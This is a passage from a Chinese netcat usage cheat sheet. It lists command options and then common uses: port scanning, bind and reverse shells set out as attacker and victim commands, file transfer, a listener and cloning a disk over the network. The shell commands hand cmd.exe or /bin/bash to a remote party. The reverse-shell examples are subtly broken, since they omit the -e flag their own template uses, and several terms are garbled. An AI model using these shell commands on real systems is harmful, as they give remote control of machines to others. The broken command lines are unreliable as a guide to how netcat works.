0x02 使用说明

-h 查看帮助信息
-d 后台模式
-g gateway source-routing hop point[s], up to 8
-G num source-routing pointer: 4, 8, 12, …
-e prog程序重定向，一但连接就执行［危险］
-i secs延时的间隔
-l 监听模式，用于入站连接
-L 监听模式，连接天闭后仍然继续监听，直到CTR+C
-n IP地址，不能用域名(不使用DNS反向查询IP地址的域名)
-o film记录16进制的传输
-p[空格]端口 本地端口号
-s addr 本地源地址
-r 随机本地及远程端口
-t 使用Telnet交互方式
-u UDP模式
-v 详细输出，用-vv将更详细
-w 数字 timeout延时间隔
-z 将输入，输出关掉（用于扫锚时）
-q <seconds> 遇到标准输入的EOF后，等待<seconds>秒后退出
# 更详细的内容，可以使用man nc 进行查看

0x03 常见用法

1. 端口扫描

nc -vv -w <seconds><ip> <port>
# 对单IP单端口进行扫描
nc -vv 192.168.1.2 80
# 对单IP多端口进行扫描
nc -vv 192.168.1.2 80-8080
# 对单IP多端口进行扫描，并设置超时时延为3秒
nc -vv -w 3 192.168.1.2 80-8080

2. 正向连接

# 受害方
nc -lvvp <port> -e <程序>
## windows:
nc -lvvp 9999 -e cmd.exe
## linux:
nc -lvvp 9999 -e /bin/bash
# 攻击方
nc <ip> <port>

3. 反向连接

# 攻击方
nc -lvvp <port>
# 受害方
nc <ip> <port> -e <程序>
## windows:
nc <ip> <port> cmd.exe
## linux:
nc <ip> <port> /bin/bash

4. 传输文件

# 发送方
nc <ip> <port> < <内容/文件名称>
# 接收方
nc -lvvp <port> > <文件名称>

5. 蜜罐

# 开启并不停的监听某一端口，结果输出到屏幕，直到按Ctrl+C为止
nc -L -p <port>
# 开启并不停的监听某一端口，结果输出到文件中，直到按Ctrl+C为止
nc -L -p <port> > <文件名称>
# 开启并不停的监听某一端口，知道按Ctrl+C为止，并将文件中的内容输出到管道中
nc -L -p <port> < <文件名称>
type.exe <文件名称> | nc -L -p <port>

6. 远程克隆硬盘

# 数据接收方
nc -lvvp <port> |dd of=/dev/sdx
# 数据发送方
dd if=/dev/sda | nc -vv <ip> <port> -q 1
